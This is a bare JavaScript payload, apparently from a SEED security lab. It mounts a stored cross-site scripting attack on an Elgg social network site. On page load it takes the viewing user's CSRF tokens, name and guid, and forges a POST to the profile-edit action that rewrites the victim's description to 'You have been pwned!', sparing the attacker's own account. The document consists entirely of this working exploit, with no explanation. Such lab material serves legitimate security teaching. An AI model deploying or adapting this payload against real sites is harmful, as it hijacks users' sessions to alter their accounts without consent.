<script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var uname = "&name=" + elgg.session.user.name;
var guid = "&guid=" + elgg.session.user.guid;
var shortDesc = "&briefdescription=You have been pwned!";

var contentData = token + ts + uname + shortDesc + guid;

var attackerGuid = 59;

var url = "http://www.seed-server.com/action/profile/edit";
if(elgg.session.user.guid != attackerGuid)
{
Ajax=new XMLHttpRequest();
Ajax.open("POST", url, true);
Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
Ajax.send(contentData);}}
</script>
